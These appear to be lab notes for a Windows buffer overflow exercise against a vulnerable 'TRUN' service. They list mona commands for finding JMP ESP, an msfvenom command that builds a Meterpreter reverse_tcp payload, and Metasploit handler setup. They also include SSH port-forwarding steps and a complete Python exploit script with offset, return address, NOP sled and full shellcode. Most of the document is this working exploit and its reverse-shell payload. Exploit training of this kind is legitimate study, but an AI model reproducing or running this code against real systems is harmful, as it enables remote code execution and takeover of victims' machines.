# From Immunity Debugger, bottom screen run !mona modules to find unprotected modules
	
# to find the JMP ESP
[Log Data Tab]
>!mona jmp -r esp -m
 Output:
	0x625012a0
	0x625012ad
	0x625012ba

# Build Reverse TCP Payload
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.40.22 lport=4444 -b "\x00" -f python

# Add the output to the script, all but the first line, add no op sled before the first line
buf += "\x90"*15 #no-op sled
	
[copy pasted tcp payload]

buf += b"\xd9\xee\xd9\x74\x24\xf4\xba\x0f\x0e\x78\x19\x5e"..
.
.
buf += b"\xd9\xee\xd9\x74\x24\xf4\xba\x0f\x0e\x78\x19\x5e"


# Execute the Exploit
>msfconsole
>use multi/handler
>set payload windows/meterpreter/reverse_tcp
>set LHOST 0.0.0.0
>set LPORT 4444
>explot
# Multi Handler is now listening


## Windows Buffer Overflow:
	ssh -MS /tmp/jojo student@10.50.20.235 [Jump Box, if window is closed closes all]
	ssh -S /tmp/jojo lol [will jump to Jump Box]
	ssh -S /tmp/jojo lol -O forward -D9050 [create a dynamic port forward]
	ssh -S /tmp/jojo lol -O forward -L<port>:<ip>:<port>


## Actual Script	
	#!/usr/bin/python2.7
	import socket
	ipaddr='10.50.37.222'
	port = 9999
	buf = "TRUN /.:/" #vulnerable command to exploit

	buf += "A" * 2003 #buffer offset to get to the eip
	buf += "\xa0\x12\x50\x62" #jump esp command run in the eip to jump to top of the stack



	''' Memory Addresses for JMP ESP
	0x625012a0
	0x625012ad
	0x625012ba
	'''

	buf += "\x90"*15 #no-op sled

	buf += b"\xd9\xee\xd9\x74\x24\xf4\xba\x0f\x0e\x78\x19\x5e"
	buf += b"\x29\xc9\xb1\x59\x83\xee\xfc\x31\x56\x15\x03\x56"
	buf += b"\x15\xed\xfb\x84\xf1\x7e\x03\x75\x02\xe0\x8d\x90"
	buf += b"\x33\x32\xe9\xd1\x66\x82\x79\xb7\x8a\x69\x2f\x2c"
	buf += b"\x9c\xda\x9a\x6a\x93\xdb\x90\x01\xfb\x12\x67\x49"
	buf += b"\xc7\x35\x1b\x90\x14\x95\x22\x5b\x69\xd4\x63\x2d"
	buf += b"\x07\x39\x39\xf9\x6c\x97\xae\x8e\x31\x2b\xce\x40"
	buf += b"\x3e\x13\xa8\xe5\x81\xe7\x04\xe7\xd1\x57\x1e\xaf"
	buf += b"\xc9\xdc\x78\x10\xeb\x31\xfd\x99\x9f\x89\xcf\xe6"
	buf += b"\x29\x7a\x1b\x92\xab\xaa\x55\x64\x6a\x9d\x9b\xc8"
	buf += b"\x6c\xe6\x9c\xf0\x1a\x1c\xdf\x8d\x1c\xe7\x9d\x49"
	buf += b"\xa8\xf7\x06\x19\x0a\xd3\xb7\xce\xcd\x90\xb4\xbb"
	buf += b"\x9a\xfe\xd8\x3a\x4e\x75\xe4\xb7\x71\x59\x6c\x83"
	buf += b"\x55\x7d\x34\x57\xf7\x24\x90\x36\x08\x36\x7c\xe6"
	buf += b"\xac\x3d\x6f\xf1\xd1\xbe\x6f\xfe\x8f\x28\xa3\x33"
	buf += b"\x30\xa8\xab\x44\x43\x9a\x74\xff\xcb\x96\xfd\xd9"
	buf += b"\x0c\xaf\xea\xd9\xc3\x17\x7a\x24\xe4\x67\x52\xe3"
	buf += b"\xb0\x37\xcc\xc2\xb8\xdc\x0c\xea\x6c\x48\x07\x7c"
	buf += b"\x85\xbe\x3f\x6a\xf1\xbc\x3f\x83\x5d\x49\xd9\xf3"
	buf += b"\x0d\x19\x76\xb4\xfd\xd9\x26\x5c\x14\xd6\x19\x7c"
	buf += b"\x17\x3d\x32\x17\xf8\xeb\x6a\x80\x61\xb6\xe1\x31"
	buf += b"\x6d\x6d\x8c\x72\xe5\x87\x70\x3c\x0e\xe2\x62\x29"
	buf += b"\x69\x0c\x7b\xaa\x1c\x0c\x11\xae\xb6\x5b\x8d\xac"
	buf += b"\xef\xab\x12\x4e\xda\xa8\x55\xb0\x9b\x98\x2e\x87"
	buf += b"\x09\xa4\x58\xe8\xdd\x24\x99\xbe\xb7\x24\xf1\x66"
	buf += b"\xec\x77\xe4\x68\x39\xe4\xb5\xfc\xc2\x5c\x69\x56"
	buf += b"\xab\x62\x54\x90\x74\x9d\xb3\xa2\x73\x61\x41\x8d"
	buf += b"\xdb\x09\xb9\x8d\xdb\xc9\xd3\x0d\x8c\xa1\x28\x21"
	buf += b"\x23\x01\xd0\xe8\x6c\x09\x5b\x7d\xde\xa8\x5c\x54"
	buf += b"\xbe\x74\x5c\x5b\x1b\x87\x27\x14\x9c\x68\xd8\x3c"
	buf += b"\xf9\x69\xd8\x40\xff\x56\x0e\x79\x75\x99\x92\x3e"
	buf += b"\x86\xac\xb7\x17\x0d\xce\xe4\x68\x04"


	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ipaddr, port))
	print s.recv(1024)
	s.send(buf)
	print s.recv(1024)
	s.close()

